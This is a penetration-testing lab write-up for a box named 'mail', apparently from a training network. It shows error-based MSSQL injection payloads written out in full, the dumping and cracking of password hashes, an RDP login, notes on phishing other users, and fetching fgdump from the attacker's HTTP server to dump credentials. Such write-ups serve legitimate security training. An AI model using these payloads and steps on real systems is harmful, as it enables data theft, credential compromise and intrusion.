# mail - 10.11.1.229

## Notes:

- Mail Server
- RDP
- Error-based SQLi

## Enumeration:

We start off this box with the standard enumeration as usual, which is scanning for ports and services with nmap to see what we can exploit. We choose nmap, as it does a good job of quickly scanning ports and services, and it is able to generally name what services, versions, and ports are open on a box:

```
nmap -sC -sV 10.11.1.229 -oA SCAN
```

Results:

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 00:08 EST
Nmap scan report for 10.11.1.229
Host is up (0.030s latency).
Not shown: 994 filtered ports
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Home Page - Long Live the Squirrel
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: IMAP4rev1 NAMESPACE OK CHILDREN ACL SORT RIGHTS=texkA0001 CAPABILITY IDLE IMAP4 completed QUOTA
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MAIL
|   NetBIOS_Domain_Name: MAIL
|   NetBIOS_Computer_Name: MAIL
|   DNS_Domain_Name: mail
|   DNS_Computer_Name: mail
|   Product_Version: 10.0.14393
|_  System_Time: 2021-03-14T05:09:13+00:00
| ssl-cert: Subject: commonName=mail
| Not valid before: 2021-03-09T16:52:52
|_Not valid after:  2021-09-08T16:52:52
|_ssl-date: 2021-03-14T05:09:13+00:00; -1s from scanner time.
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.95 seconds
```

We see http, which means that there is a webpage, so generally we want to go there first to see what outward facing vulnerabilities we can find. That being said, we might not find anything, since this is most likely a mail server, due to its name and services such as SimpleMailTransferProtocol (smtp) and pop3.

On the site, we find some stuff about squirrels and a newsletter that can be signed up for, with two form fields: Username and Email Address. There does not really seem to be anything else on the site that is very interesting or exploitable, and I decide to move on, but keep the form fields in the back of my mind in case it is vulnerable to a SQL injection.

Now we try to enumerate the Simple Mail Transfer Protocol (SMTP) server on port 25. We connect via telnet, which is a command line interface that can be used for smtp. From that connection, we find that it is `220 MAIL ESMTP`, which is provided by the server. After looking up exploits for this version of SMTP, I did not find any exploits that corresponded with this specific version.


## SQL Injection:

We return to the newsletter signup box to retry SQL injection. Generally we try SQL injection whenever there are form fields that can be entered into by the user. Through this, we might be able to craft a query that will get us important information, and we can use that to exploit.

In the user field, we put an `'` and in the email field, which is my standard test for SQL injection, as it will generally throw a syntax error, and we put arbitrary characters in the username field, and we get a SQL error page, which means that the site is vulnerable to SQL injection, likely error-based, where we are able to read the output errors and gain information from there. I chose to do this, as anytime there are fields to fill out in a website, I just quickly check to see if they are vulnerable to SQLi by placing in the apostrophe.

First, we need to fix the syntax, so the syntax is not throwing the error, and instead we can craft SQL queries that return errors with the information we want. 

Good places to start are combinations of characters such as `,`, `;`, `)`, and `"` as they usually occur to the end of a SQL statement. 


I also thought about the structure of the SQL syntax. Since it's probably entering the input into a database, the syntax is probably something like `INSERT INTO db VALUES('username', 'email')`. Since there are two insertion values, one way we could pop the error with an erroneous `convert` command, which converts a piece of data, as highlighted in section 0x2b in [this paper](https://www.exploit-db.com/papers/12975). If we try to convert say a database name into an integer, it will return an error along with the actual database name. 

The order of username and email could als be reversed. In either case, we just want to close the single quote and the comma after the first term, then we want to end the parenthesis and comment out the rest at the end. 

The format for our injection is then `', INJECTION )--`. The order of the injection could also be reversed, with email before username, but that does not really matter as of now, as we can just try both fields with our inject. We know that we want to target the first part of the injection with the command, as we want to have the second section be the erroneous convert command. That is why we decided to add the `',` at the beginning. 

First, let's try to enumerate the MySQL version based on the paper.

We put the following command in the username field and an arbitrary value in the email field. This command tries to convert the version into an integer, which will fail and give us a useful error message:

```
',convert(int,@@version))--
```

By virtue of the inject working when it is in the username field, it probably comes first in the inject.

We finally make some headway!

```
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64)
Aug 22 2017 17:04:49
Copyright (C) 2017 Microsoft Corporation
Express Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

Now we know the SQL version.

Let's get some more pertinent information now, like the database name with the same error-generating convert query:

```
',convert(int,db_name()))--
```

Results:

```
Conversion failed when converting the nvarchar value 'newsletter' to data type int.
```

Now we know the table is named `newsletter`.

Let's go to enumerating the username of the user running the database. If have `sa` privileges, it means we can use an exploit with `XP_CMDSHELL` to have remote code execution.

We load the following command into our formatting and send it:

```
',convert(int,user_name()))--
```

Unfortunately, it isn't anything interesting:

```
Conversion failed when converting the nvarchar value 'webapp' to data type int.
```

Next, let's move on to the actual contents of the database.

First, let's try to get the table names.

This command targets `information_schema.tables`, which stores information about tables in the databases, and the `table_name` fields stores the table names. This command selects the name of the first table:

```
',convert(int,(select top 1 table_name from information_schema.tables)))--
```

The result is the users table, which is pretty expected, as that is generally where user information is stored:

```
Conversion failed when converting the nvarchar value 'users' to data type int.
```

Let's see if there are any more tables, by running the same query, but with an appending command that says look for tables that are not `users` to see if there is anything else:

```
',convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('users'))))--
```

We get no response, so the `users` table is probably the only table in the database. From my understanding, generally the `users` table is pretty standard in its layout, but let's enumerate the column names just for practice.

This time, the command tries to convert a column name, and the error will be the column name.

```
',convert(int,(select top 1 column_name from information_schema.columns where table_name='users')))--
```
 
Running this command as previously with the `not in` function gives us the following columns: (I used a python script to generate the injections, as I got a bit lazy copy pasting. It is found in my tools/misc folder).

```
user_id
username
email
```

Now let's try to get the usernames from the table with the exact same method, but this time targetting the actual rows of the table:

```
', convert(int,(select top 1 username from users)))--
```

We again run it, specifying the `not in` usernames that we already read, until we get no response. Our final script:

```
', convert(int,(select top 1 username from users where username not in ('eric','alice','pedro','admin'))))--
```

Now we know the users:

```
eric
alice
pedro
admin
```

Let's work on getting their emails now, with the same method and this command:

```
', convert(int,(select top 1 email from users)))--
```

We again specify the `not in` for the emails we find:

```
', convert(int,(select top 1 email from users where email not in ())))--
```

Our final script is: `', convert(int,(select top 1 email from users where email not in ('eric@thinc.local','alice@thinc.local','pedro@thinc.local','admin@thinc.local'))))--`

We have the emails:

```
eric@thinc.local
alice@thinc.local
pedro@thinc.local
admin@thinc.local
```

This is some good information, but we still don't really have a foothold. Let's try to see if there are any other databases using commands from [this link](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/). This inject specifically goes after the master database list and queries it based on database id:

```
',CONVERT(INT,(SELECT CAST(name AS nvarchar(4000)) FROM master..sysdatabases WHERE dbid=1)))--
```

From this, we get the following error:

```
Conversion failed when converting the nvarchar value 'master' to data type int.
```

Interesting, there is a master database. We also try changing the dbid to integers 1-6, representing the different existing dbs, and get the following:

|dbid|db_name|
|-----|------|
|1|master|
|2|tempdb|
|3|model|
|4|msdb|
|5|newsletter|
|6|archive|

Let's try to see the data in master first. It's name suggests that it has perhaps more sensitive information.

We use the following command to find the tables in master. It is the same command as before, accessing the information_schema, but instead of the schema of the database we are currently in, we can specify the master database:

```
',convert(int,(select top 1 table_name from master.information_schema.tables where table_name not in ('spt_fallback_db','spt_fallback_dev','spt_fallback_usg','spt_values','spt_monitor'))))--
```

There doesn't seem to be anything interesting in master unfortunately.

Next, let's try the archive database. That also sounds a bit interesting:

We start again by finding out what tables are in the database through the information schema:

```
',convert(int,(select top 1 table_name from archive.information_schema.tables)))--
```

Again, we specify the different values we get as `not in`.

We get only one table: `pmanager`. Let's check out its columns:

',convert(int,(select top 1 column_name from archive.information_schema.columns where table_name='pmanager' and column_name not in ('id','alogin','psw'))))--

1. id
2. alogin
3. psw

Nice! Looks like we have a login and password column. Now we need to dump the information, all with the same strategies as before, but specifying the specific database and table:

```
', convert(int,(select top 1 alogin from archive..pmanager)))--
```

This is done in the same way as before, except we specify the external table with `archive..pmanager`, be sure to have the two periods.

We also continue to update the `not in` with whatever alogins we get:

```
', convert(int,(select top 1 alogin from archive..pmanager where alogin not in ('ftpadmin','webadmin','administrator','eric'))))--
```

We get the following info:

1. ftpadmin
2. webadmin
3. administrator
4. eric

Now, let's get the passwords with the same adapted commands from before:

```
', convert(int,(select top 1 psw from archive..pmanager)))--
```

Our final command with all the hashes accounted for:

```
', convert(int,(select top 1 psw from archive..pmanager where psw not in ('7de6b6f0afadd89c3ed558da43930181','5b413fe170836079622f4131fe6efa2d','3c744b99b8623362b466efb7203fd182','cb2d5be3c78be06d47b697468ad3b33b'))))--
```

We got some hashes!

|User|Hash|
|----|-----|
|ftpadmin|7de6b6f0afadd89c3ed558da43930181|
|webadmin|5b413fe170836079622f4131fe6efa2d|
|administrator|3c744b99b8623362b466efb7203fd182|
|eric|cb2d5be3c78be06d47b697468ad3b33b|

We can now use JohntheRipper to crack the hashes, as John is my goto hash cracker.

First we put all of our hashes into a text file, one per line, with nothing else.

Then we run John on it:

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hash
```

Unfortunately, it does not work, I don't really know why, but the output is all messed up. Instead, we can try to use [Crackstation](crackstation.net), which is also a tool for cracking hashes with a huge database of plaintext indexed to their hashes. 

We were able to crack eric's hash, which is `sup3rs3cr3t`. Now we need to figure out how to use this information.

Looking back at our nmap, we see that the box is running RDP on port 3389. Since RDP is essentially a command line with a graphical interface, we should try to use Eric's creds there. It is essentially ssh with a graphical interface, so logging in there is only logical.

First, we need to install an RDP client for Linux. I chose Remmina, because I have used it in the past for some CTF competitions and I am familiar with it.

```
sudo apt install remmina
```

We now open up Remina and login in to eric's account with his password on the 10.11.1.229 domain. It works! 

## Winning:

It also turns out he has admin privileges, so we can just access the Admin desktop and open the proof.txt.

![](flag.png)

## Post-Exploitation:

On Eric's desktop, we see that he has Mozilla Thunderbird, which is essentially an email and chat client. In it, we find some pretty juicy emails, which I have listed in chronological order:

From Malroy:

```
Hola Eric,

I'm leaving on vacation tomorrow, so you have to pick up the recurring tasks.

Remember that Pedro expects the email statistics every day in PDF format

There are still issues with the update server on Peters workstation, so if you have any important updates wrap them in a HTA file and shoot him a link.

Kind regards

Malroy
```

From Peter:

```
Hi Eric,

Thanks for the update file, it worked like a charm

/Peter

On 4/24/2019 12:44 PM, eric wrote:
> Hi Peter,
>
> As you are aware there are some issues with the update service on your desktop. I have some important updates that I need you to install. Please access the link below and execute the code
>
> http://10.60.60.226/Update.hta
>
>
> Best regards
>
> Eric
>
>
```

From Malroy:

```
I am out on vacation
```

From Pedro:

```

Thanks!

On 4/24/2019 12:55 PM, eric wrote:
> Hi Pedro,
>
> Since Malroy is out, I've sent you the email stats as attached
>
> Best regards
>
> Eric
>

```

We find some good information:

1. Remember that Pedro expects the email statistics every day in PDF format
2. We might be able to send an update file to Peter

These two suggest that we might be able to send something malicious via Eric to Peter and Pedro in order to gain access to their machines.

I will cover these in their own writeups.

## Password Dump:

Let's try to password dump this box to see if we can find and crack any password hashes that might give us an edge in other boxes.

We get the fgdump.exe binary, which is a binary for Windows that dumps the cached password hashes. Since we have a remote desktop, we can pull it off of a SimpleHTTPServer. 

First, we copy the binary into our folder:

```
cp /usr/share/windows-binaries/fgdump/fgdump.exe fgdump.exe    
```

Then we host it with the Python SimpleHTTPServer module:

```
sudo python -m SimpleHTTPServer 80   
```

We then open a web browser and navigate to 192.168.119.162/fgdump, which is our hosted file and download it.

Finally, we run it with fgdump.exe in the command line. Unfortunately, the command just hangs, so I might need to find a different password dumper.

## Helpful Links:

- crackstation.net
- https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/ 
- https://www.exploit-db.com/papers/12975
- https://jetmore.org/john/code/swaks/files/swaks-20201014.0/swaks 
- https://rootflag.io/hack-the-box-sneakymailer/